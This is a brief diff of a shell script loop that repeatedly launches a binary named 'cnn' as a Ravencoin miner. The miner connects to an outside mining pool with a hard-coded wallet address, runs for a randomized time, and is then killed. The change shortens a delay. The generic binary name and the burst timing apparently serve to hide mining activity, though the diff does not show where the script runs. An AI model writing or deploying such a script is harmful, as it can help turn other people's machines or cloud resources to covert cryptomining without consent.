@@ -10,7 +10,7 @@ do
 	c=$(($a+$b))
 
 	w=$(($RANDOM%60))
-	e=120
+	e=10
 	aaram=$(($w+$e))
 	timeout -k 5 $c\s   ./cnn/cnn -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@asia.ravenminer.com:13802 -U
 	timeout -k 5 2s pgrep cnn | xargs kill
